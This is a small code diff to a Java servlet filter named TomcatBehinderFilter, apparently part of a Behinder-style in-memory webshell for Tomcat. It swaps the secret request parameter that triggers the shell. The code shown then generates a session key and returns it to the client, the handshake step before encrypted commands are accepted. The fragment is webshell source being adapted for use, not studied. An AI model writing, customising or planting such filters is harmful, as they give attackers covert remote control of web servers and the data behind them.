@@ -31,7 +31,7 @@ public class TomcatBehinderFilter extends ClassLoader implements Filter {
             HttpServletResponse rsp = (HttpServletResponse) response;
             HttpSession session = req.getSession();
 
-            if (req.getParameter("xhstormr") != null) {
+            if (req.getParameter("34aa503f95bb") != null) {
                 String key = UUID.randomUUID().toString().replace("-", "").substring(16);
                 session.setAttribute("u", key);
                 rsp.getWriter().print(key);
